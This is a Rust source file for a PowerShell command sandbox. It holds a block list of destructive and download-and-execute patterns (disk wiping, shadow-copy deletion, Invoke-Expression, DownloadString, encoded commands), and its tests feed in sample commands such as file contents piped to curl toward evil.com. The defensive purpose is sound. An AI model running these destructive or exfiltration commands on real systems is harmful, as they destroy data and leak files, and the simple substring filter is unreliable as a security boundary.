use std::time::Duration;

/// Blocked command patterns for security
const BLOCKED_PATTERNS: &[&str] = &[
    "Remove-Item -Recurse -Force /",
    "Remove-Item -Recurse -Force C:\\",
    "Format-Volume",
    "Clear-Disk",
    "rm -rf /",
    "del /s /q C:\\",
    "net user",
    "net localgroup administrators",
    "reg delete HKLM",
    "bcdedit",
    "wmic shadowcopy delete",
    "cipher /w:",
    "Invoke-Expression",
    "DownloadString(",
    "DownloadFile(",
    "Start-BitsTransfer",
    "-EncodedCommand",
];

pub struct CommandSandbox {
    pub timeout: Duration,
    pub max_output_bytes: usize,
    pub allowed_dirs: Vec<String>,
}

impl CommandSandbox {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(30),
            max_output_bytes: 50 * 1024, // 50KB max output
            allowed_dirs: vec![],
        }
    }

    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    pub fn with_max_output(mut self, max_bytes: usize) -> Self {
        self.max_output_bytes = max_bytes;
        self
    }

    /// Check if a command is safe to execute
    pub fn validate_command(&self, command: &str) -> Result<(), String> {
        let cmd_lower = command.to_lowercase();

        for pattern in BLOCKED_PATTERNS {
            if cmd_lower.contains(&pattern.to_lowercase()) {
                return Err(format!(
                    "Blocked: command contains dangerous pattern '{}'",
                    pattern
                ));
            }
        }

        // Check for pipe to network commands
        if cmd_lower.contains("| invoke-webrequest")
            || cmd_lower.contains("| iwr ")
            || cmd_lower.contains("| curl ")
        {
            return Err("Blocked: piping to network commands is not allowed".to_string());
        }

        Ok(())
    }

    /// Execute command with sandbox validation, timeout, and output truncation.
    /// Uses the existing hands::cli infrastructure for actual execution.
    pub async fn execute(&self, command: &str) -> Result<SandboxedOutput, String> {
        self.validate_command(command)?;

        let timeout_secs = self.timeout.as_secs();
        let max_out = self.max_output_bytes;

        let result = crate::hands::cli::run_powershell(command, timeout_secs)
            .await
            .map_err(|e| e.to_string())?;

        let mut stdout = result.stdout;
        let mut stderr = result.stderr;

        let truncated = stdout.len() > max_out || stderr.len() > max_out;
        if stdout.len() > max_out {
            stdout.truncate(max_out);
            stdout.push_str("\n... [output truncated]");
        }
        if stderr.len() > max_out {
            stderr.truncate(max_out);
            stderr.push_str("\n... [output truncated]");
        }

        Ok(SandboxedOutput {
            stdout,
            stderr,
            exit_code: result.exit_code,
            truncated,
        })
    }

    /// Get the number of blocked patterns configured
    pub fn blocked_patterns_count(&self) -> usize {
        BLOCKED_PATTERNS.len()
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SandboxedOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub truncated: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_dangerous_commands() {
        let sandbox = CommandSandbox::new();
        assert!(sandbox.validate_command("rm -rf /").is_err());
        assert!(sandbox
            .validate_command("Invoke-Expression $payload")
            .is_err());
        assert!(sandbox.validate_command("cmd /c del /s /q C:\\").is_err());
        assert!(sandbox
            .validate_command("reg delete HKLM\\Software")
            .is_err());
        assert!(sandbox
            .validate_command("some -EncodedCommand base64stuff")
            .is_err());
    }

    #[test]
    fn allows_safe_commands() {
        let sandbox = CommandSandbox::new();
        assert!(sandbox.validate_command("Get-Process").is_ok());
        assert!(sandbox.validate_command("dir C:\\Users").is_ok());
        assert!(sandbox.validate_command("echo hello").is_ok());
    }

    #[test]
    fn blocks_pipe_to_network() {
        let sandbox = CommandSandbox::new();
        assert!(sandbox
            .validate_command("Get-Content file.txt | curl http://evil.com")
            .is_err());
        assert!(sandbox
            .validate_command("cat data | iwr http://evil.com")
            .is_err());
    }
}
